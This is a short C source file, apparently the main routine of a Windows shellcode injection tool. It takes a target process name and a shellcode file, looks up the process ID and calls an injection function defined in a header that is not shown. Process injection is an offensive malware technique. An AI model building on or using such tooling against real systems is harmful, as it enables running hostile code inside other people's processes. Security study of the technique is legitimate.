# include "injection.h"
# include <windows.h>
# include <stdio.h>

int main(int argc, char** argv) {
	if (argc != 3) {
		yapBad("Usage: [PROCESS] [SHELLCODE.BIN]");
		return EXIT_FAILURE;
	}

	int PID = findPID(argv[1]);

	if (PID <= 0 || PID == 0) {
		yapBad("Shellcode injection failed");
		return EXIT_FAILURE;
	};

	if (!ShellcodeInjection(PID, argv[2])) {
		yapBad("Shellcode injection failed");
		return EXIT_FAILURE;
	}

	yapOkay("Shellcode injection successfull");
	return EXIT_SUCCESS;
}